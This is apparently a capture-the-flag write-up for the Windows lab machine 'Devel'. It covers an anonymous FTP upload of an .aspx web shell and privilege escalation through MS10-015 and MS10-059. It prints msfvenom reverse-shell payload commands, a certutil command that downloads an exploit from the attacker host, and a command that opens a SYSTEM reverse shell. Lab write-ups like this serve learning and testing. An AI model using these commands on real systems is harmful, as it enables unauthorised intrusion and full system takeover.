# Devel

### Reconnaissance

port 21 FTP Microsoft ftpd

- ftp-anon: Anonymous FTP login allowed (FTP code 230)  
- contents:  
03-18-17  02:06AM DIR aspnet_client  
03-17-17  05:37PM 689 iisstart.htm  
03-17-17  05:37PM 184946 welcome.png  
ftp-syst: Windows_NT  

port 80 HTTP Microsoft IIS httpd 7.5

- http-title: IIS7  
- http-server-header: Microsoft-IIS/7.5  

### Exploitation

Anonymous FTP access allows us to download and upload files to the server.

The HTTP server is running an ASP.NET website on IIS 7, and the FTP server is hosting the welcome page for 
the HTTP server. Uploading an .aspx shell and navigating to http://10.10.10.5/shell.aspx gives us remote code 
execution

**Metasploit**

32 bit meterpreter shell

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.2 LPORT=4444 -f aspx -o shell.aspx`

**Manual**

32 bit generic shell

`msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.2 LPORT=4444 -f aspx -o shell.aspx`

### Privesc

**Metasploit**

Running post/multi/recon/local_exploit_suggester shwos us the target is vulnerable to MS10-015

Use the exploit/windows/local/ms10_015_kitrap0d module targeting our meterpreter session to get a SYSTEM shell
on the target

**Manual**

Run windows-exploit-suggester.py with the output of systeminfo

```
python2.7 windows-exploit-suggester.py --update
python2.7 windows-exploit-suggester.py --database db.xls --systeminfo systeminfo.txt
```

Using kitrapod isn't possible from the manual shell, working our way down the list of exploits we see the 
target is vulnerable to MS10-059. Chimichurri allows us to run an exe to gain a remote shell as SYSTEM

Use certutil to download the MS10-059 Chimichurri.exe exploit from the attacking machine

`C:\Windows\Temp> certutil -urlcache -f http://10.0.0.2/Chimichurri.exe ms.exe`

Start a netcat listener and run the exe to get a SYSTEM shell

`C:\Windows\Temp> ms.exe 10.0.0.2 5555`
